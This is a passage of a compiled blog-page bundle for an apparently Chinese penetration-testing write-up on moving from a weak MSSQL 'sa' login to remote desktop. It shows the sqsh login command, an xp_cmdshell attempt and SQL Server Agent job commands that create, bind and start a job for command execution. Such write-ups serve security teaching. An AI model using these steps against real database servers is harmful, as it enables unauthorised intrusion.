<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>功能​</strong>​：添加清理步骤</li><li>​<strong>​作用​</strong>​：删除第一步生成的临时文件</li><li>​<strong>​参数​</strong>​： <ul><li><code>@on_success_action = 1</code>：成功后退出报告成功</li></ul></li></ul><p>以上就是设置<code>agent</code>的主要命令，接下来是一些必要命令:<br> 绑定作业到服务器：</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">EXEC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">sp_add_jobserver</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @job_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @server_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> N&#39;(local)&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">go</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>功能​</strong>​：将作业附加到本地服务器实例</li><li>​<strong>​必需步骤​</strong>​：否则作业无法运行</li></ul><p>启动作业：</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">EXEC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">sp_start_job</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">go</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Job </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;SystemMaintenance&#39;</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> started</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> successfully.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>​<strong>​功能​</strong>​：立即启动作业</li><li>​<strong>​输出​</strong>​：成功启动确认</li></ul><p>检查作业状态</p>`,35)]))}const d=i(e,[["render",h],["__file","从mssql到rdp远程桌面连接.html.vue"]]),r=JSON.parse('{"path":"/article/01_%E9%A1%B9%E7%9B%AE/%E6%B8%97%E9%80%8F/%E5%AE%9E%E6%88%98/%E4%BB%8Emssql%E5%88%B0rdp%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5.html","title":"从mssql到rdp远程桌面连接","lang":"zh-CN","frontmatter":{"aliases":null,"cssclasses":null,"tags":null,"icon":"pen-to-square","date":"2025-10-16T00:00:00.000Z","title":"从mssql到rdp远程桌面连接","category":["项目"],"description":"fscan扫描，爆出mssql弱密码san:1 使用sqsh连接mssql 首次xp_cmdshellRCE尝试 为了执行命令，首先查看最短最方便的路径xp_cmdshell命令执行 启动xp_cmdshell 查询xp_cmdshell是否启用 显示已经启用 但是在命令执行时却出现问题 错误代码5，这表示“访问被拒绝”。这通常是由于SQL Serve...","head":[["meta",{"property":"og:url","content":"https://github.com/fakeppa/fakeppa.github.io/article/01_%E9%A1%B9%E7%9B%AE/%E6%B8%97%E9%80%8F/%E5%AE%9E%E6%88%98/%E4%BB%8Emssql%E5%88%B0rdp%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5.html"}],["meta",{"property":"og:site_name","content":"问己"}],["meta",{"property":"og:title","content":"从mssql到rdp远程桌面连接"}],["meta",{"property":"og:description","content":"fscan扫描，爆出mssql弱密码san:1 使用sqsh连接mssql 首次xp_cmdshellRCE尝试 为了执行命令，首先查看最短最方便的路径xp_cmdshell命令执行 启动xp_cmdshell 查询xp_cmdshell是否启用 显示已经启用 但是在命令执行时却出现问题 错误代码5，这表示“访问被拒绝”。这通常是由于SQL Serve..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-10-16T09:43:59.000Z"}],["meta",{"property":"article:published_time","content":"2025-10-16T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-10-16T09:43:59.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"从mssql到rdp远程桌面连接\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2025-10-16T00:00:00.000Z\\",\\"dateModified\\":\\"2025-10-16T09:43:59.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fakeppa\\",\\"url\\":\\"https://github.com/fakeppa/fakeppa.github.io\\"}]}"]]},"headers":[{"level":2,"title":"首次xp_cmdshellRCE尝试","slug":"首次xp-cmdshellrce尝试","link":"#首次xp-cmdshellrce尝试","children":[]},{"level":2,"title":"SQL Agent 作业RCE","slug":"sql-agent-作业rce","link":"#sql-agent-作业rce","children":[{"level":3,"title":"准备步骤","slug":"准备步骤","link":"#准备步骤","children":[]},{"level":3,"title":"添加作业步骤","slug":"添加作业步骤","link":"#添加作业步骤","children":[]}]}],"git":{"createdTime":1760606081000,"updatedTime":1760607839000,"contributors":[{"name":"fakeppa","username":"fakeppa","email":"l17091799155@qq.com","commits":4,"url":"https://github.com/fakeppa"}]},"readingTime":{"minutes":2.68,"words":804},"filePathRelative":"article/01_项目/渗透/实战/从mssql到rdp远程桌面连接.md","localizedDate":"2025年10月16日","excerpt":"<p><code>fscan</code>扫描，爆出<code>mssql</code>弱密码<code>san:1</code><br>\\n使用sqsh连接mssql</p>\\n<div class=\\"language-bash line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"bash\\" data-title=\\"bash\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">sqsh</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -S</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> 10.99.xx.xx</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -U</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> sa</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -P</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 1</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{d as comp,r as data};
